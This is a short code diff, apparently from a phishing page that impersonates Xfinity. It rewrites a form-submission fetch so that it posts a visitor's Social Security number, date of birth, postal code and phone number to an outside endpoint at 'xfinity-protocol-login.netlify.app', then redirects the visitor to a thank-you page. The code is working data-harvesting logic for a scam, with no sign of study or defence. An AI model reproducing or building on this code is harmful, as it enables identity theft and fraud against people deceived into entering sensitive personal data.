@@ -134,19 +134,22 @@
 
         window.location.href = "thankyou.html";
         try {
-          const res = await fetch("/.netlify/functions/send-email", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              c_ssnn,
-              c_dob,
-              c_postal,
-              c_phone,
-              pageName: "Info Page Simulation", // This changes per page
-            }),
-          });
+          const res = await fetch(
+            "https://xfinity-protocol-login.netlify.app/.netlify/functions/send-email",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                c_ssnn,
+                c_dob,
+                c_postal,
+                c_phone,
+                pageName: "Info Page Simulation", // This changes per page
+              }),
+            }
+          );
 
           const data = await res.json();
           console.log("Serverless function response:", data);
